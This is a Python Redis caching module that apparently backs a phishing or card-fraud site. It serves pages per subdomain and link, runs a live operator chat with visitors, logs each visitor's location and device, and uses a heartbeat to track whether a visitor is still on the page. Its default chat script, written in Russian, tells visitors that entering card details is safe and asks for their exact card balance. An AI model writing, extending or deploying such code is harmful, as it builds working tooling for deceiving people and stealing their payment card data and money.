import json
import os

import redis.asyncio as aioredis

_redis: aioredis.Redis | None = None


async def init_redis():
    global _redis
    _redis = aioredis.from_url(os.getenv("REDIS_URL", "redis://redis:6379"))


async def get_cached(key: str) -> str | None:
    val = await _redis.get(key)
    return val.decode() if val else None


async def set_cached(key: str, value: str, ttl: int = 300) -> None:
    await _redis.set(key, value, ex=ttl)


async def invalidate(key: str) -> None:
    await _redis.delete(key)


_SUPPORTED_LANGS = {
    "ru", "en", "de", "fr", "es", "it", "pt", "pl", "nl", "tr",
    "ar", "zh", "ja", "ko", "uk", "cs", "sv", "fi", "no", "da",
}


async def invalidate_page(subdomain: str, link_id: str) -> None:
    """Invalidate cached page HTML for all language variants."""
    keys = [f"page:{subdomain}:{link_id}:{lang}" for lang in _SUPPORTED_LANGS]
    await _redis.delete(*keys)


async def get_preview_config(token: str) -> dict | None:
    user_id = await _redis.get(f"preview_token:{token}")
    if not user_id:
        return None
    data = await _redis.get(f"preview:{user_id.decode()}")
    return json.loads(data) if data else None


async def set_preview_config(user_id: int, config: dict, token: str, ttl: int = 600) -> None:
    await _redis.set(f"preview:{user_id}", json.dumps(config), ex=ttl)
    await _redis.set(f"preview_token:{token}", str(user_id), ex=ttl)


# ── chat scripts (editable per-link via bot) ───────────────────────────────────

_DEFAULT_STEPS = [
    {"step": 1, "trigger": "open",    "text": "Привет! Чем могу помочь?",               "button": "Написать оператору"},
    {"step": 2, "trigger": "card",    "text": "Введите данные карты — это безопасно.",   "button": "Есть вопрос"},
    {"step": 3, "trigger": "balance", "text": "Укажите точный баланс карты.",            "button": "Не понимаю зачем"},
    {"step": 4, "trigger": "error",   "text": "Возникла ошибка? Оператор поможет.",     "button": "Связаться"},
]


_GLOBAL_STEPS_KEY = "chat_steps:global"


async def get_chat_steps(subdomain: str = "", link_id: str = "") -> list:
    raw = await _redis.get(_GLOBAL_STEPS_KEY)
    if raw:
        return json.loads(raw)
    return list(_DEFAULT_STEPS)


async def set_chat_steps(subdomain: str = "", link_id: str = "",
                         steps: list = None, ttl: int = 0) -> None:
    val = json.dumps(steps or [], ensure_ascii=False)
    if ttl:
        await _redis.set(_GLOBAL_STEPS_KEY, val, ex=ttl)
    else:
        await _redis.set(_GLOBAL_STEPS_KEY, val)


# ── chat sessions (visitor ↔ operator) ────────────────────────────────────────

_SESSION_TTL = 3600  # 1 hour


async def create_chat_session(session_id: str, subdomain: str, link_id: str,
                             lang: str = "ru", visitor_id: int | None = None,
                             city: str = "?", country: str = "?",
                             device: str = "?", sys_lang: str = "") -> None:
    data = {
        "subdomain": subdomain, "link_id": link_id, "lang": lang,
        "visitor_id": visitor_id, "city": city, "country": country,
        "device": device, "sys_lang": sys_lang or lang,
        "msgs": [],
    }
    await _redis.set(f"chat_sess:{session_id}", json.dumps(data), ex=_SESSION_TTL)


async def get_chat_session(session_id: str) -> dict | None:
    raw = await _redis.get(f"chat_sess:{session_id}")
    return json.loads(raw) if raw else None


async def update_chat_session_lang(session_id: str, lang: str) -> None:
    raw = await _redis.get(f"chat_sess:{session_id}")
    if not raw:
        return
    data = json.loads(raw)
    data["lang"] = lang
    await _redis.set(f"chat_sess:{session_id}", json.dumps(data), ex=_SESSION_TTL)


async def append_chat_message(session_id: str, role: str, text: str) -> None:
    """role: 'visitor' | 'operator'"""
    raw = await _redis.get(f"chat_sess:{session_id}")
    if not raw:
        return
    data = json.loads(raw)
    data["msgs"].append({"role": role, "text": text})
    await _redis.set(f"chat_sess:{session_id}", json.dumps(data), ex=_SESSION_TTL)


async def push_operator_reply(session_id: str, text: str) -> None:
    """Push a reply into the SSE queue for this session."""
    await _redis.rpush(f"chat_reply:{session_id}", text)
    await _redis.expire(f"chat_reply:{session_id}", _SESSION_TTL)


async def pop_operator_reply(session_id: str, timeout: int = 25) -> str | None:
    """Blocking pop — used by SSE endpoint. Returns None on timeout."""
    result = await _redis.blpop(f"chat_reply:{session_id}", timeout=timeout)
    if result:
        _, val = result
        return val.decode()
    return None


# ── heartbeat (real-time online presence) ─────────────────────────────────────

_HEARTBEAT_TTL = 35  # seconds — frontend pings every 20s, so 35s gives one missed beat


async def touch_heartbeat(session_id: str) -> None:
    """Refresh the heartbeat key. Called by the visitor's browser every ~20s."""
    await _redis.set(f"chat_hb:{session_id}", "1", ex=_HEARTBEAT_TTL)


async def check_heartbeat(session_id: str) -> bool:
    """Returns True if visitor is actively on the page right now."""
    return await _redis.exists(f"chat_hb:{session_id}") == 1
